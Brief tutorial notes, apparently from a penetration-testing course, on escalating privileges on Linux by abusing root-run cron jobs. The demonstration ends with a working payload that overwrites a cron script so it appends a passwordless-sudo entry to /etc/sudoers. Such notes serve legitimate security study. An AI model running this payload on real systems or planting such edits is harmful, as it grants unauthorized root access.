# Exploiting Misconfigured Con Jobs

- Linux implements task scheduling through a utility called `Cron`
- Cron is a time based service that runs applications, scripts and other commands repeatedly on a specific schedule (daily backups, system upgrade...)
- A repeatedly running script using Cron is called a Cron job
- the crontab file is a configuration file that is used by Cron to store and track Cron jobs that have been created

- Cron jobs can be run as any user on a system
- To elevate our privileges we will need to find a identify cron jobs scheduled by the root user or files being processed by the job

## Demonstration

```bash
# list user crontab
crontab -l
# find a string
grep -rnw /usr -e "/home/student/message"
# modify the script without editor
printf '#!/bin/bash\necho "student ALL=NOPASSWD:ALL" >> /etc/sudoers' > <cron_script>
```
